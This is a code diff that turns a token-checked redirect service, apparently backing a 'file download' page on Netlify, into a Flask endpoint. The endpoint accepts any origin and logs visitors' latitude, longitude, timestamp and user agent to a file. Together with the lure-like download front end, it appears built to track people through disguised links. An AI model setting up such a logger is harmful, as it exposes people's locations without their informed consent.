@@ -1,38 +1,29 @@
-from fastapi import FastAPI
-from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import RedirectResponse
-from fastapi import HTTPException
+from flask import Flask, request, jsonify
+from flask_cors import CORS
 
-app = FastAPI()
+app = Flask(__name__)
+CORS(app)  # Allow CORS from Netlify
 
-# Allow requests from your frontend's domain
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["https://file.download1.netlify.app"],  # replace with your actual frontend URL
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
+@app.route("/location", methods=["POST"])
+def receive_location():
+    data = request.get_json()
+    if not data:
+        return jsonify({"error": "No data received"}), 400
 
-# File links
-FILES = {
-    "abc123": {
-        "token": "xyz123abc123",
-        "url": "https://images.app.goo.gl/V9J1jjiqLmMASrP89"
-    },
-    "xyz456": {
-        "token": "abc123xyz123",
-        "url": "https://youtu.be/a3Ue-LN5B9U?si=lQel_ypvIkbDuG2u"
-    }
-}
+    latitude = data.get("latitude")
+    longitude = data.get("longitude")
+    timestamp = data.get("timestamp")
+    user_agent = data.get("userAgent")
 
-@app.get("/download")
-async def download(hash: str, token: str):
-    file_entry = FILES.get(hash)
-    if not file_entry:
-        raise HTTPException(status_code=404, detail="Invalid hash")
+    log_entry = f"[{timestamp}] Location: {latitude}, {longitude} | UA: {user_agent}\n"
+    print(log_entry)
 
-    if file_entry["token"] != token:
-        raise HTTPException(status_code=403, detail="Invalid token")
+    # Optional: Save to file
+    with open("locations.log", "a") as f:
+        f.write(log_entry)
 
-    return RedirectResponse(url=file_entry["url"])
+    return jsonify({"status": "Location received"}), 200
+
+@app.route("/")
+def home():
+    return "Location Logger API is running!", 200
